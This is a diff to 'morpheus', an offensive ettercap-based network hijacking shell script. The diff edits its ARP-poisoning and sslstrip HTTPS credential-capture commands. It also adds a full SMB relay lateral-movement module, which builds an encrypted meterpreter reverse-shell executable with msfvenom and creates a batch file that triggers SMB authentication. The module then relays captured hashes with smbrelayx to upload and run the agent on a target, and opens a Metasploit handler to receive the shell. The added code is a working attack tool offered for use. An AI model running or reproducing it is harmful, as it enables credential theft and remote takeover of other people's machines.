@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # morpheus - automated ettercap TCP/IP Hijacking tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.1
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 2.2
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2018
 # codename: oneiroi_phobetor [ GPL licensed ]
 #
@@ -53,7 +53,7 @@ Reset="${Escape}[0m";
 # Variable declarations
 # ---------------------
 dtr=`date | awk '{print $4}'`        # grab current hour
-V3R="2.1"                            # module version number
+V3R="2.2"                            # module version number
 cnm="oneiroi_phobetor"               # module codename
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
 IPATH=`pwd`                          # grab morpheus.sh install path
@@ -2675,12 +2675,12 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
     echo ${GreenF}[☠]${white} Using IPv6 settings ${Reset};
     echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
     sleep 2
-    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
+    xterm -T "MORPHEUS - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
   else
     echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
     echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
     sleep 2
-    python $dnsproxypath & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
+    xterm -T "MORPHEUS - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
   fi
 
 
@@ -2696,7 +2696,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   iptables --table nat --delete-chain
   # reset ip-forward
   echo "0" > /proc/sys/net/ipv4/ip_forward
-  echo ${BlueF}[☠]${white} editing sslstrip session log File ${BlueF}]${Reset};
+  echo ${BlueF}[☠]${white} editing sslstrip session log File ${Reset};
   sleep 4
   xterm -T "Sslstrip session log" -e "nano $IPATH/output/log.txt"
   sleep 2
@@ -2707,6 +2707,141 @@ else
   sleep 2
 fi
 }
+
+
+
+
+
+
+
+# ----------------------------------------------------
+# C&C SMBrelay attack (c&c smb exploit)
+# ----------------------------------------------------
+sh_stage21 () {
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}In morpheus SMB Relay lateral movement attack we will need 2 pcs  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}(attacker,target) the attacker machine will wait for any smb auth ${BlueF}|"
+echo "${BlueF}    | ${YellowF}attempts in local lan and uses the hashs captured to authenticate ${BlueF}|"
+echo "${BlueF}    | ${YellowF}itself on target machine to upload and execute remote our agent.  ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+
+
+
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
+if [ "$?" -eq "0" ]; then
+
+#
+# config module settings ..
+#
+echo ${BlueF}[☠]${white} Enter module settings!${Reset};
+sleep 2
+lhost=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270)
+lport=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 666" --entry --width 270)
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "example: 192.168.1.100" --entry --width 270)
+
+
+  #
+  # start metasploit services
+  #
+  echo ${BlueF}[☠]${white} Start metasploit services ..${Reset};
+  service postgresql start
+    if [ "$RbUdB" = "YES" ]; then
+      msfdb delete
+      msfdb init
+    fi
+
+
+  #
+  # check dependencies ..
+  #
+  echo ${BlueF}[☠]${white} Check module dependencies ..${Reset};
+  sleep 2
+  if [ -d /opt/impacket ]; then
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Python impacket libs found ..${Reset};
+    sleep 2
+  else
+    echo ${BlueF}[${RedF}x${BlueF}]${white} Python impacket libs not found ..${Reset};
+    sleep 2
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Installing impacket python libs ..${Reset};
+    echo ""
+    cd /opt
+    git clone https://github.com/CoreSecurity/impacket.git
+    cd impacket 
+    pip install ldap3
+    python setup.py install
+    echo ""
+  fi
+
+
+#
+# build payload and trigger
+#
+echo ${BlueF}[☠]${white} Building rc4 agent.exe ..${Reset};
+sleep 2
+xterm -T "MORPHEUS BUILD AGENT.EXE" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f exe -n 20 -o $IPATH/output/agent.exe"
+
+
+#
+# parse modem ip address ..
+#
+# parsing data (192.168.1.) [print first 10 chars]
+# parse=`echo $IP | grep "192" | cut -c1-10`
+# delete last 3 chars from string
+# v1=`ifconfig | grep "broadcast" | awk {'print $6'}`
+# v2=`echo ${v1::-3}`
+#
+# remove everything after the final [ . ]
+parse=`echo ${IP%.*}`
+
+# Now, lets simulate the scanner (trigger.bat) by attempting to connect to the C$
+# of our attackers Linux box (192.168.1.71) from the scanner server (192.168.1.19)
+# STRING: FOR /L %%i IN (1,1,255) DO dir \\192.168.1.%%i\c$
+echo ${BlueF}[☠]${white} Building trigger.bat ..${Reset};
+sleep 2
+cd $IPATH/bin
+sed "s|RePlAcE|$parse|g" trigger.bat > done.bat
+mv done.bat $IPATH/output/trigger.bat
+
+#
+# final notes ..
+#
+zenity --title "☠ FINAL NOTES ☠" --text "Morpheus its now ready to use the SmbRelay lateral\nmovement attack as soon we click the 'yes' button.\n\nIf we wish to [ manually ] trigger the vulnerability\nthen we are going to need a 3º PC were we are going\nto execute the [ trigger.bat ] file to simulate one smb\nauth attempt on local lan so that morpheus can use\nthat captured credentials to upload/execute our\nagent.exe into target PC [ RHOST ]" --info --width 360 --height 270
+
+
+#
+# smbrelay attack
+#
+cd $IPATH/bin/Utils
+echo ""
+python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "MORPHEUS - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp_rc4; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'"
+echo ""
+
+#
+# clean
+#
+echo ${BlueF}[☠]${white} cleaning old files .. ${Reset};
+sleep 2
+cd $IPATH/output/
+killall python
+rm trigger.bat
+
+
+#
+# abort button pressed ..
+#
+else
+  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
+
 
 
 
@@ -2854,7 +2989,7 @@ Colors;
 while :
 do
 clear
-echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
+echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
 cat << !
     ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
     ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
@@ -2886,7 +3021,8 @@ cat << !
     |  17    -  Devices DHCP discovery          -  devices modem auth   |
     |  18    -  Block cpu crypto-minning        -  drop/kill packets    |
     |  19    -  Redirect browser traffic        -  to google pranks     |
-    |  20    -  Capture https credentials       -  sslstrip + dns2proxy |
+    |  20    -  Capture https credentials       -  sslstrip+dns2proxy   |
+    |  21    -  SMBrelay lateral movement       -  C&C SMBRelay exploit |
     |                                                                   |
     |   W    -  Write your own filter                                   |
     |   S    -  Scan LAN for live hosts                                 |
@@ -2920,7 +3056,8 @@ case $choice in
 18) sh_stage18 ;;
 19) sh_stage19 ;;
 20) sh_stage20 ;;
-# 20) echo "[x] Please Wait, Under develop .."; sleep 1.3 ;;
+21) sh_stage21 ;;
+# 21) echo "[x] Please Wait, Under develop .."; sleep 1.3 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
